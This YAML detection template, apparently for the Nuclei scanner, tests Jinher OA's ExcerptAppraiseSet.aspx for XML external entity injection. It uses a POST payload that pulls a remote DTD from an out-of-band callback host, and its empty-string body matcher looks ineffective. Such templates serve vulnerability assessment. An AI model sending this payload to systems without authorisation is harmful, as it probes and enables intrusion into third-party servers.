id: poc-yaml-jinher-excerptappraiseset-aspx-xxe
info:
  name: 金和OA ExcerptAppraiseSet.aspx XXE漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: xxe, dnslog
http:
  - method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers:
      - type: word
        words:
          - "JHSoft"
        part: body
  - method: POST
    path:
      - "{{BaseURL}}/c6/Jhsoft.Web.Appraise/ExcerptAppraiseSet.aspx/"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |-
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE root [
      <!ENTITY % remote SYSTEM "https://{{interactsh-url}}/xxe_test">
      %remote;]>
      <root/>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ""
        part: body
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
